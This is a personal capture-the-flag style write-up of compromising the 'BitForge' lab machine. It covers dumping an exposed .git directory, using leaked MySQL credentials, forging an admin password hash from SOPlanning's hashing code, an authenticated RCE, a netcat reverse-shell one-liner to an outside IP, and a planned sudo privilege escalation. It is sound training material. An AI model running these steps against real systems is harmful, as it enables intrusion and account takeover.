# BitForge

so i start off by scanning ports:

<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

I add bitforge.lob to my /etc/hosts file and go visit the website:

<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

I click on login, see nothing and click on employee portal:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Then i add the new vhost to the hosts file and see this portal:

<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

then i find this exploit that seems perfect:

<figure><img src="../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

So i need to find a user, i remebered that with the nmap scan it found a /.git/ directory:

<figure><img src="../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

maybe a username we can exploit:

<figure><img src="../../../.gitbook/assets/image (96).png" alt=""><figcaption><p>mcsam@bitforge.lab</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption><p>1ce700a508aec3d5e4d4aa1b128a662f2c85f5ad</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

ok so this seems like the way to go so i do what git dumper does but by hand ->

```
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://bitforge.lab/.git/
```

<figure><img src="../../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

Now we can connect to the mysql db and enumerate everything using the dbName

i can connect with the creds BitForgeAdmin:B1tForG3S0ftw4r3S0lutions and i had a problem:

```
ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
```

that i bypassed with the --skip-ssl arg:

<figure><img src="../../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

After enumerating databases and tables i found this:

<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

So to identify the hash type i used hashlib:

```
echo "77ba9273d4bcfa9387ae8652377f4c189e5a47ee" | hashid
```

and it turned out to be \[+] SHA-1

```
hashcat -m 100 -a 0 77ba9273d4bcfa9387ae8652377f4c189e5a47ee /usr/share/wordlists/rockyou.txt
```

but i was unsuccesful so i tried other stuff:

{% embed url="https://hackviser.com/tactics/pentesting/services/mysql#post-exploitation" %}

Here i got stuck and had to look at a writeup and i wouldn't have found the attack vector on my own:&#x20;

> we can download the source code for the application, which is publicly available online ([source](https://master.dl.sourceforge.net/project/soplanning/soplanning/1.52.01/soplanning.zip?viasf=1)).
>
> Upon reviewing the source code, we found a file (`soplanning/includes/class_user.inc`) that handles password hashing. The relevant code snippet is as follows:
>
> ```
> public function hashPassword($password){
>     return sha1("�" . $password . "�");
> }
> ```

So from there i can create a php script that uses this function to create a valid hash that we can inject in the database:

```php
<?php
function hashPassword($password) {
    return sha1("�" . $password . "�");
}

$username = "admin";
$password = "password123";
$hashedPassword = hashPassword($password);

echo "Username: $username\n";
echo "Password: $password\n";
echo "Hashed Password: $hashedPassword\n";
?>
```

```
Username: admin
Password: password123
Hashed Password: ac0da8e3a1a9a231eb527bfb9b093de676e02efe
```

And now we can update the password of the admin in the database:

```
UPDATE planning_user SET password="ac0da8e3a1a9a231eb527bfb9b093de676e02efe" WHERE user_id="ADM";
```

<figure><img src="../../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

and i'm able to use the authenticated CVE RCE to get a shell:

<figure><img src="../../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

after punching the air to get a reverse shell since this shell is annoying and restrictive i understood that there was probably firewall outbound connection restrictons and i had to go through port 80 ->

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.51 80 >/tmp/f
```

<figure><img src="../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

So after enumerating for a bit i quickly see that i have to pivot to an other user so i download on the target pspy and linpeas and run the 2 tools and find some nice stuff after waiting for a bit:

<figure><img src="../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

so i can switch user to jack:

<figure><img src="../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

After looking at what's this app:

<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

bruh box broke when i was about to go root, can't stop the process, will come back later but basically what i was going to to was write in app.py, import os and add chmod +x /bin/sh so when sudo user launches the app i get special privileges and can su to root
